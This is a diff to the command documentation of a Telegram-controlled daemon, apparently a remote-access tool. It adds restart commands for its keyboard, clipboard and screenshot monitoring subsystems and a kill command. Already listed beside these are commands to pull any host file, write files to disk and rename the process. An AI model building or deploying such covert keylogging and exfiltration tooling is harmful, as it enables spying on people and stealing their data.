@@ -182,6 +182,13 @@ C2T_DELIVERY_ATTEMPTS=5 C2T_RETRY_DELAY_MS=1000 c2t
 - `/pause` (or `/mute`, `/stop_listen`, `/disable`): Temporarily pauses clipboard and keyboard monitoring.
 - `/resume` (or `/unmute`, `/start_listen`, `/enable`): Resumes active monitoring.
 - `/toggle`: Toggles between paused and active monitoring states.
+- `/restart [subsystem|all|daemon]` (or `/reset`, `/reboot`, `/reload`): Restarts and resets subsystems or the entire daemon process:
+  - `/restart keyboard` (or `/restart_kb`, `/reset_keyboard`): Re-initializes keyboard listener and worker.
+  - `/restart clipboard` (or `/restart_clip`, `/reset_clipboard`): Re-initializes clipboard monitoring worker.
+  - `/restart screenshot` (or `/restart_shot`, `/reset_screenshot`): Re-initializes screenshot backend and capture timer.
+  - `/restart logs` (or `/reset_logs`): Flushes and restarts log sender subsystem.
+  - `/restart all` (or `/restart_all`, `/reset_all`): Resets and restarts all subsystems in-place.
+  - `/restart daemon` (or `/restart`, `/reboot`): Fully restarts the daemon process (via supervisor or clean binary re-exec).
 - `/getfile <path>`: Retrieves and sends any file from the host filesystem as a Telegram document attachment.
 - `/upload [path]` (or sending any attached file/document with optional destination path in caption): Downloads and writes incoming files directly to host disk.
 - `/ls [path]`: Lists files and directories with sizes and permissions.
@@ -190,6 +197,7 @@ C2T_DELIVERY_ATTEMPTS=5 C2T_RETRY_DELAY_MS=1000 c2t
 - `/logs` (or `/log`): Drains and retrieves buffered execution logs.
 - `/status` (or `/ping`): Returns daemon status, monitoring state, metrics, and throughput.
 - `/process_name [name]` (or `/rename`, `/procname`): Views or dynamically changes the daemon's process title and identification.
+- `/kill` (or `/stop`, `/shutdown`, `/terminate`, `/quit`, `/exit`): Gracefully stops and terminates the daemon.
 - `/help`: Displays available commands.
 
 All commands and file transfers from unauthorized chat IDs are discarded.
